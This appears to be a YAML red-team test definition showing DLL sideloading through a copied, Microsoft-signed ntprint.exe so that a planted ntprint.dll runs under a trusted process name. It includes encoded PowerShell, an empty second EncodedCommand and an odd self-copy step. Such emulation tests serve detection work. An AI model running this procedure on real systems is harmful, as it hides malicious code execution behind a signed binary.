- id: d710b9f3-a0da-543b-ba0a-89c1e21f6da4
  name: Soumaia ART Tests - DLL Search Order Hijacking - ntprint
  description: 'This technique abuses the legitimate, Microsoft-signed ntprint.exe as a living-off-the-land loader by copying it out of C:\Windows\System32 into a user-controlled directory and launching it with the next command-line PSetupElevatedLegacyPrintDriverInstallW, which causes the process to attempt to load ntprint.dll; due to Windows DLL search behavior, placing a malicious ntprint.dll in the same directory results in that DLL being loaded alongside the trusted binary, providing code execution inside a seemingly benign Windows component and blending activity under a signed process name (a classic DLL sideloading/search-order hijack pattern)

    Reference: https://www.hexacorn.com/blog/2025/10/06/ntprint-exe-lolbin/ (requires elevation)'
  tactic: stealth
  technique:
    attack_id: T1574.001
    name: 'Hijack Execution Flow: DLL'
  platforms:
    windows:
      cmd:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAG4AdABwAHIAaQBuAHQALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
          if not "%ERRORLEVEL%"=="0" (
              powershell -NoProfile -EncodedCommand 
          )
          mkdir "%USERPROFILE%\atomic"
          cd "%USERPROFILE%\atomic"
          copy ".\ntprint.dll" .
          copy /y C:\Windows\System32\ntprint.exe .
          ntprint.exe PSetupElevatedLegacyPrintDriverInstallW {}
        cleanup: |-
          cd "%USERPROFILE%"
          rmdir /s /q "%USERPROFILE%\atomic"
        payloads:
        - ntprint.dll
